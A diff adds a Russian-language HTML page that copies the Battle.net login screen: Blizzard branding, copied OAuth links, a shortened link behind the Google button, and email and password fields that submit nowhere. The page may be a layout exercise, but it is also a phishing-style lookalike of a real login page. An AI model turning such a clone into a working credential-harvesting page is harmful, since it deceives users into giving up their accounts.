@@ -1,0 +1,222 @@
+<html lang="ru">
+    <head>
+        <meta charset="UTF-8"> 
+        <title>ЖОПА Авторизация в Battle.net</title>   
+        <link rel="shortcut icon" href="battle_img/favicon.png" type="image/png">
+    </head>
+    <body>
+        <div class="box-wrapper">
+            <style> 
+                body{
+                    background: #15171e;
+                    font-family: "Object Sans", "Arial", "Helvetica", "Segoe UI Symbol", "Segoe MDL2 Assets", sans-serif;
+                    line-height: 24px;
+                    margin-left: 550; 
+                    margin-top: 55;
+                }
+                .battlenet_head{
+                    margin-top: 60;
+                    margin-left: 90;
+                    margin-bottom: 60;
+                }
+                h3{
+                    font-weight: 700;
+                    font-size: 33px;
+                    margin-left: 75;
+                    margin-bottom: 47;
+                    color: white;
+                }
+                .messangers button{
+                    width: 48;
+                    height: 48;
+                    border-radius: 4px;
+                    border-color: transparent;
+                    position: relative;
+                }
+                .top button{
+                    margin: 10;
+                    left: 100;
+                }
+                .bottom button{
+                    margin: 10;
+                    left: 65;
+                }
+                fieldset {
+                    border-left: none;
+                    border-right: none;
+                    border-bottom: none;
+                    text-align: center;
+                    border-color: #7c7d74;
+                    font-weight: 800;
+                    font-size: 14px;
+                    width: 380;
+                    color: #8c8d86;
+                    margin-top: 46;
+                }
+                .control-input input{
+                    width: 405;
+                    height: 38;
+                    margin: 15;
+                    margin-left: 1;
+                    padding-left: 15;
+                    font-size: 16;
+                    background-color: transparent;
+                    border-style: solid;
+                    border-width: 1;
+                    font-weight: 700;
+                    border-radius: 20;
+                    display: block;
+                    border-radius: 4.5px;
+                }
+                .eye{
+                    margin-left: 370;
+                    width: 23;
+                    margin-top: -43;
+                }
+                .log_in button{
+                    width: 405;
+                    height: 41;
+                    margin-top: 31;
+                    background-color: #0074e0;
+                    font-weight: 600;
+                    color: white;
+                    border-radius: 4.5px;
+                    border-color: transparent;
+                    font-size: 17.5;
+                }
+                .help-links{
+                    list-style-type: none;
+                    font-size: 15;
+                    width: 350;
+                    margin-left: -600;
+                    margin-top: 53;
+                    
+                }
+                .help-links a{
+                    color:  #148eff;
+                    text-decoration: none;
+                    font-size: 16px;
+                    font-weight: 700;
+                }      
+                .que{
+                    margin-top: 10;
+                }
+                footer, footer a{
+                    color: #919395;
+                    text-decoration: none;
+                    width: 650;
+                    font-size: 12.5;
+                    margin-top: 55;
+                    font-weight: 550;
+                }
+                footer{
+                    margin-left: -490;
+                    margin-bottom: 50;
+                    font-family: "Object Sans", "Arial", "Helvetica", "Segoe UI Symbol", "Segoe MDL2 Assets", sans-serif;
+                }
+                .google, .apple, .steam{
+                    background-color: white;
+                }
+                .facebook{
+                    background-color: #1877f2;
+                }
+                .green{
+                    background-color: #107c10;
+
+                }
+                .blue{
+                    background-color:#0070cc;
+
+                }
+                .red{
+                    background-color: red;
+                }
+                .copyright{
+                    color: #4a5155;
+                    font-size: 14;
+                    font-weight: 500;
+                }
+            </style>
+            <div class="input">
+                <div class="login">
+                    <div class="battlenet_head">
+                        <img src="battle_img/logo_head.png" width="245" height="45" alt="">
+                    </div>
+                    <h3 id="login-header">Авторизоваться</h3>
+                    <div class="messangers">
+                        <div class="top">                                
+                            <button class="google" onclick="window.location.href='https://clck.ru/35geE4'"><img height="18" width="17" src="battle_img/google.svg" ></button>
+                            <button class="facebook" onclick="window.location.href='https://www.facebook.com/v2.12/dialog/oauth?client_id=1173546789331741&response_type=code&state=Ae3kGYC2DKoDgc7a9xR0B8x_TCyUGn67JzOl-a_JCygblUJ1T__VNzxRyjja1jm7r7OF9naTDOymRGT8P1kRfpRvtAL_ALmM0R1dIVhAX-dNQDFYe0BMM_yRRcnw9T7pGEU8Rg4B3T52FMzVeylXpbOcM8otISzuX9Seat6q7XdtkyVxZkzSHagAQjNaSJbh9jZAgUUbasS7LsvfetbaLBiYbrwwpz8qWxaxSUrb6MBCBGGEGKeiietn_uSLOwQjvMrFShs2vt0-RgrCGrnEP3vzSuX6lk6olAO8jTnmwwy3NeuAvBgtueW1N6fqM844eg%3D%3D&scheme&deviceProof=9f9bda5ce5efeaeb3f1379d172363efea5df8ea4b27a3ff23f96eca7e36b58bc&redirect_uri=https%3A%2F%2Feu.account.battle.net%2Flogin%2Fsignin%2Ffacebook&scope=public_profile+email+user_friends&isMASDK=false'"><img height="18" width="17" src="battle_img/facebook.svg"></button>
+                            <button class="apple" onclick="window.location.href='https://appleid.apple.com/auth/authorize?client_id=com.blizzard.login&response_type=code&state=AWd0vZKHuOQdfV2XrR-vPt3pQHoTaVydBS-zfCxfPEEbjY03fl5lq_N4Pn0imYzN50ko61-YaRzUic-wunAMXeO15astB8imwOZYi38U5TSDc2efnW3Fps0q7awCUR5GMW8ymVdGPItCtYqcNdaGkIej9whJrSQoeYfQf06Xu4VJ7bP0tlSliRzIBpFu0XHUD_zgPSpRyA3-iQ4haMXvjvA2Ysy06_E8Ehu6VkBsH7CvtWbZzOkTnnOAnxdCyXnCf4KYQCIftKv7qZPSWhNsz1sa4XIUIqpvh9K0XrJ-UuL0Yh7fsgWWvVr7ImHIMK6amg%3D%3D&response_mode=form_post&scheme&deviceProof=9f9bda5ce5efeaeb3f1379d172363efea5df8ea4b27a3ff23f96eca7e36b58bc&redirect_uri=https%3A%2F%2Feu.account.battle.net%2Flogin%2Fsignin%2Fapple&scope=email+name&isMASDK=false'"><img height="18" width="17" src="battle_img/apple.svg"></button>
+                        </div>
+                        <div class="bottom">
+                            <button class="green" onclick="window.location.href='https://account.live.com/Consent/Update?mkt=RU-RU&uiflavor=web&id=290794&ru=https://login.live.com/oauth20_authorize.srf%3fuaid%3d0e2543310d7a4588af8864e25019f7df%26client_id%3d000000004417E628%26opid%3dFBB42FF607A0F684%26mkt%3dRU-RU%26opidt%3d1694541723'"><img height="18" width="17" src="battle_img/1.svg" ></button>
+                            <button class="blue" onclick="window.location.href='https://my.account.sony.com/central/signin/?client_id=b5b165c3-4146-4a8e-822b-1116fd3b96d0&response_type=code&state=AbZ1Xj_Bi-sSH_pfBjytXv6kAj4ql8vODWOFjqoDZhcZR2yF-K0vnVjQBcj5e1pihS2StS-wCYQjHZ7ry0RGb5P7uvxUQGoU5QDUHPiqG1-0jE91vg-WWAL9tgh4AKVhHXZWvtnJNYlHFwUKr7hKSXynE6qVL3plovH-mrU_7qNnOs1B8C4w56aK78rMDtRQ9MDKcAyWHe2yGbsSpD9h4pUmd1oNU7D2sa5nInQQh4lL5Vg8-EEsSvUDPUzhqskvibI-K0RDo18MWFCarjlkHqguG3cE8kkvp6pmWiK_C6GHeY9ZAFcVT8ZlcLoaKnwX0w%3D%3D&scheme&deviceProof=9f9bda5ce5efeaeb3f1379d172363efea5df8ea4b27a3ff23f96eca7e36b58bc&redirect_uri=https%3A%2F%2Feu.account.battle.net%2Flogin%2Fsignin%2Fpsn&scope=psn%3As2s&isMASDK=false&cid=7fef0f1a-8b53-40b9-a506-ac4610753b53&error=login_required&error_code=4165&no_captcha=false#/signin/ca?entry=ca'"><img height="18" width="17" src="battle_img/2.svg" ></button>
+                            <button class="red" onclick="window.location.href='https://accounts.nintendo.com/authorize_guide?redirect_uri=https%3A%2F%2Faccounts.nintendo.com%2Fconnect%2F1.0.0%2Fauthorize%3Fclient_id%3D2b8f48e61685a62a%26deviceProof%3D9f9bda5ce5efeaeb3f1379d172363efea5df8ea4b27a3ff23f96eca7e36b58bc%26interacted%3D1%26isMASDK%3Dfalse%26redirect_uri%3Dhttps%253A%252F%252Feu.account.battle.net%252Flogin%252Fsignin%252Fnintendo%26response_type%3Dcode%26scheme%3D%26scope%3Dopenid%2Boffline%2Buser.basic%2Buser.email%26state%3DAWzpUHgaG5jqTbtbbZK2LuYd6ORqIQFi_kKZip52_oN-jvO-jrSoYIAWqOjpbBR87tSZxOk2NHen2e8lRQv3gPFSahscwWt8AcMt0SbExYJ9Dvam9t6B0yShJBEK9DbSFUlknRtYbatrrqaHu3gFJkCurYziyPChxfz8nyZz5v32vR-HwvvGLjiONp0Njif1F3hOV8a2Cy1rUtorr050x8UspfC-BDvyvwoWe17bCvkG2MYUfYUODWR7fpzgC27wtSC_Pey60s851xAaOQzuDzUpft7KPaCLC0Hq8KPR3LD8q4QPnl4-Zrj2MNjAmhJdLw%253D%253D&type=mixed'"><img height="18" width="17" src="battle_img/3.svg" ></button>
+                            <button class="steam" onclick="window.location.href='https://steamcommunity.com/openid/loginform/?goto=%2Fopenid%2Flogin%3Fopenid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Feu.account.battle.net%252Flogin%252Fsignin%252Fsteam%253Fstate%253DAQhqAgaINZxeZCpHR64NQ_7M6DTRe_ml2HuztCDP-RB1FYtdDy3ejZOL0mf_2J1F-RqnnnjKV7QMjsbZFka4rtbrLHBWidxQqaa3SK9MFFqQzFFSCYtJqAzkj1GTw323M1Khxc4b0S-4Gstat4tEcAGQdusDrOfQtlRSO0hRbnmPGVbh7rCgFGTfUEc55Zp1Kb0whm38f9hO378PRpGaOs1PifBp2pK6Ncyh7f24E7wMla4cPd-Yjx6AnTF-2jyHOKPKXqqRUCJNYDP3ghmMGe2ZhpYnXyEhsqxENbptM-sLheCLXo410Rr9nznZGrLlMg%253D%253D%26openid.realm%3Dhttps%253A%252F%252Feu.account.battle.net%252Flogin%252Fsignin%252Fsteam%253Fstate%253DAQhqAgaINZxeZCpHR64NQ_7M6DTRe_ml2HuztCDP-RB1FYtdDy3ejZOL0mf_2J1F-RqnnnjKV7QMjsbZFka4rtbrLHBWidxQqaa3SK9MFFqQzFFSCYtJqAzkj1GTw323M1Khxc4b0S-4Gstat4tEcAGQdusDrOfQtlRSO0hRbnmPGVbh7rCgFGTfUEc55Zp1Kb0whm38f9hO378PRpGaOs1PifBp2pK6Ncyh7f24E7wMla4cPd-Yjx6AnTF-2jyHOKPKXqqRUCJNYDP3ghmMGe2ZhpYnXyEhsqxENbptM-sLheCLXo410Rr9nznZGrLlMg%253D%253D%26openid.mode%3Dcheckid_setup%26isMASDK%3Dfalse%3Fopenid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Feu.account.battle.net%252Flogin%252Fsignin%252Fsteam%253Fstate%253DAQhqAgaINZxeZCpHR64NQ_7M6DTRe_ml2HuztCDP-RB1FYtdDy3ejZOL0mf_2J1F-RqnnnjKV7QMjsbZFka4rtbrLHBWidxQqaa3SK9MFFqQzFFSCYtJqAzkj1GTw323M1Khxc4b0S-4Gstat4tEcAGQdusDrOfQtlRSO0hRbnmPGVbh7rCgFGTfUEc55Zp1Kb0whm38f9hO378PRpGaOs1PifBp2pK6Ncyh7f24E7wMla4cPd-Yjx6AnTF-2jyHOKPKXqqRUCJNYDP3ghmMGe2ZhpYnXyEhsqxENbptM-sLheCLXo410Rr9nznZGrLlMg%253D%253D%26openid.realm%3Dhttps%253A%252F%252Feu.account.battle.net%252Flogin%252Fsignin%252Fsteam%253Fstate%253DAQhqAgaINZxeZCpHR64NQ_7M6DTRe_ml2HuztCDP-RB1FYtdDy3ejZOL0mf_2J1F-RqnnnjKV7QMjsbZFka4rtbrLHBWidxQqaa3SK9MFFqQzFFSCYtJqAzkj1GTw323M1Khxc4b0S-4Gstat4tEcAGQdusDrOfQtlRSO0hRbnmPGVbh7rCgFGTfUEc55Zp1Kb0whm38f9hO378PRpGaOs1PifBp2pK6Ncyh7f24E7wMla4cPd-Yjx6AnTF-2jyHOKPKXqqRUCJNYDP3ghmMGe2ZhpYnXyEhsqxENbptM-sLheCLXo410Rr9nznZGrLlMg%253D%253D%26openid.mode%3Dcheckid_setup'"><img height="18" width="17" src="battle_img/4.svg" ></button>
+                        </div>
+                    </div>
+                    <div class="thirdparty-line">
+                        <fieldset>
+                            <legend>ㅤили войти черезㅤ</legend>
+                          </fieldset>
+                    </div>
+                    <div class="control-input">
+                        <div class="mail">
+                            <input maxlength="320" placeholder="Электронная почта или телефон" autocorrect="off" spellcheck="false">
+                        </div>
+                        <div class="password">
+                            <div class="password">                        
+                                <input placeholder="Пароль" autocorrect="off" spellcheck="false">
+                                <img class="eye" src="battle_img/eye.png" alt="">
+                            </div>
+                        </div>
+                    
+                    </div>
+                    <div class="log_in">
+                        <button aria-label="Авторизация">Авторизоваться</button>
+                    </div>
+                    <center>
+                        <ul class="help-links">
+                            <li role="link">
+                                    <a rel="internal" href="https://account.battle.net/creation/?ref=https%3A%2F%2Feu.shop.battle.net%2Fru-ru&amp;theme=bnet-next&amp;app=shop&amp;hostingApp=shop&amp;flowTrackingId=b403928f-3824-4176-b87f-4b7fb1efd921&amp;bdp=9f9bda5ce5efeaeb3f1379d172363efea5df8ea4b27a3ff23f96eca7e36b58bc">
+                                    Зарегистрируйте учетную запись Battle.net бесплатно
+                                    </a>
+                            </li>
+                            <div class="que">
+                                <li role="link">
+                                    <a rel="internal" href="https://account.battle.net/recovery/?ref=&amp;theme=bnet-next&amp;app=shop&amp;hostingApp=shop&amp;flowTrackingId=b403928f-3824-4176-b87f-4b7fb1efd921" >
+                                    Вы не можете войти?
+                                    </a>
+                                </li>
+                            </div>
+                        </ul>
+                    </center>
+                    <center>
+                        <footer id="footer" class="footer ru-ru">
+                            <div class="fot">
+                                <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula" data-analytics="global-nav" data-analytics-placement="Footer - eula">ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ BLIZZARD</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="https://www.blizzard.com/company/about/privacy.html" data-analytics="global-nav" data-analytics-placement="Footer - Privacy">ПОЛИТИКА КОНФИДЕНЦИАЛЬНОСТИ</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/" data-analytics="global-nav" data-analytics-placement="Footer - Terms">УСЛОВИЯ</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="https://eu.blizzard.com/company/about/infringementnotice.html" data-analytics="global-nav" data-analytics-placement="Footer - copyright">АВТОРСКОЕ ПРАВО</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="/login/cookies" data-analytics="global-nav" data-analytics-placement="Footer - Cookies">ФАЙЛЫ COOKIE</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="/login/cookies#settings" data-analytics="global-nav" data-analytics-placement="Footer - Cookie Settings">ПАРАМЕТРЫ COOKIE</a>
+                                <div class="copyright">© Blizzard Entertainment, INC., 2023</div>
+                            </div>
+                        </footer>
+                    </center>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+
+
+
+
+</html>
